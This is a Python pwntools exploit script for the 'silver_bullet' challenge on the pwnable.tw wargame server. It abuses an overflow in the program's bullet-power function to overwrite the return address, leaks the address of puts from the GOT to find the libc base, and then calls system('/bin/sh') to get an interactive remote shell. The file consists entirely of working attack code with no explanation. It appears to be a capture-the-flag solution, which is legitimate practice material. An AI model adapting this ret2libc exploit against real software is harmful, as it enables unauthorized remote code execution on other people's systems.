from pwn import *

context(terminal = ['deepin-terminal','-x','sh','-c'],log_level = 'debug',arch = 'i386',os = 'linux')


debug = 0
ElfPath = './silver_bullet'
LibcPath = './libc_32.so.6'
RemoteAddr = 'chall.pwnable.tw'
RemotePort = '10103'

elf = ELF(ElfPath)
if debug:
    sh = process(ElfPath)
    libc = elf.libc
else:
    sh = remote(RemoteAddr,RemotePort)
    if LibcPath:
       libc = ELF(LibcPath)

def create(content):
    sh.sendlineafter('choice :','1''')
    sh.sendlineafter('bullet :',content)

def power(content):
    sh.sendlineafter('choice :','2')
    sh.sendlineafter('bullet :',content)

def ret():
    sh.sendlineafter('choice :','3')

create('a'*0x2f)
power('b')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']

payload = '\xff'*0x3 + p32(0xdeadbeef) + p32(puts_plt) + p32(main_addr) + p32(puts_got)
#gdb.attach(sh)
power(payload)
ret()
sh.recvuntil('!\n')
puts_addr = u32(sh.recv(4))
libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + libc.search('/bin/sh').next()

create('a'*0x2f)
power('b')

payload = '\xff'*0x3 + p32(0xdeadbeef) + p32(system_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)
power(payload)
ret()

sh.interactive()
sh.close()
